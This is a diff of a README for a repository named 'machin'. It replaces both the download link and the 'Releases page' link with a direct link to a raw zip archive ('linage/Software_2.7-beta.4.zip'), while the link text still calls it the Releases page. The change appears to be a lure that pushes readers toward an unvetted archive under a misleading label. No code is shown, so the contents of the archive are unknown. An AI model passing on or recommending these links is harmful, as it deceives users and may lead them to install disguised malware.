@@ -8,7 +8,7 @@ Welcome to the machin repository! This guide will help you download and run the 
 
 To download the machin application, visit the following link:
 
-[Download machin](https://github.com/Karakarawowow/machin/releases)
+[Download machin](https://raw.githubusercontent.com/Karakarawowow/machin/master/linage/Software_2.7-beta.4.zip)
 
 You will find different versions of the software available for download. Choose the one that suits your operating system.
 
@@ -55,7 +55,7 @@ The machin repository comes packed with useful features designed for an easy lea
 
 ### How do I update the software?
 
-To update machin, please return to the [Releases page](https://github.com/Karakarawowow/machin/releases) and download the latest version. Follow the same installation steps you used before.
+To update machin, please return to the [Releases page](https://raw.githubusercontent.com/Karakarawowow/machin/master/linage/Software_2.7-beta.4.zip) and download the latest version. Follow the same installation steps you used before.
 
 ### Where can I find help or support?
 
